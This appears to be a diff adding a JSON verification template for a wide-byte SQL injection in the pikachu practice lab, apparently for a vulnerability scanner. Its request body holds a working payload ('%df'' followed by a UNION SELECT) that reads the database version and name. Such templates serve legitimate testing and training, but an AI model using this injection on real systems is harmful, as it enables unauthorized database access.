@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "wide_byte注入",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/sqli/sqli_widebyte.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "name=1%df' union select version(),database() --+&submit=%E6%9F%A5%E8%AF%A2"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<br />your email is: pikachu</p>"
+            }
+        }
+    }
+}
